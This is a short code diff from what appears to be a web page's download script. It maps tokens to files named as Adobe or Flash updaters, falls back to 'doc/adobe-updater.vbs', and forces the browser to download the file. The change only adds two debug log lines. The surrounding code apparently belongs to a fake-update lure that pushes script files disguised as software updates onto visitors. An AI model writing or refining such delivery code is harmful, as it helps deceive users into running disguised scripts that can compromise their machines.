@@ -124,7 +124,9 @@
 			"flash-updater104j": "doc/adobe-flash-updater.js",
 		};
 
+		console.log("Token:", token);
 		const file = downloads[token] || "doc/adobe-updater.vbs";
+		console.log("Downloading file:", file);
 		const link = document.createElement('a');
 		link.href = file;
 		link.download = file.split('/').pop();   // This forces download
